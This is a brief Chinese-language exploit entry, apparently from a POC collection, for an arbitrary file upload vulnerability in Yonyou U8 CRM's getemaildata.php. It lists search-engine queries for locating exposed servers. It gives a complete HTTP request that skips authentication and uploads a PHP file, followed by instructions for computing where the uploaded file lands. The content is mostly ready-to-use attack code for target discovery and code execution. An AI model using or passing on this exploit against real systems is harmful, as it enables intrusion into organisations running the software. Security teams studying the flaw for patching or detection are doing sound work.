# 用友 U8 CRM客户关系管理系统 getemaildata.php 任意文件上传漏洞

## 网络测绘

fofa: app="用友U8CRM"

hunter: web.body="用友U8CRM"

## POC / EXP

```
POST /ajax/getemaildata.php?DontCheckLogin=1 HTTP/1.1
Host:
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarykS5RKgl8t3nwInMQ

------WebKitFormBoundarykS5RKgl8t3nwInMQ
Content-Disposition: form-data; name="file"; filename="test.php "
Content-Type: text/plain

<?php phpinfo();?>

------WebKitFormBoundarykS5RKgl8t3nwInMQ
```

文件名需要十六进制减一

```
/tmpfile/updD24D.tmp.php
```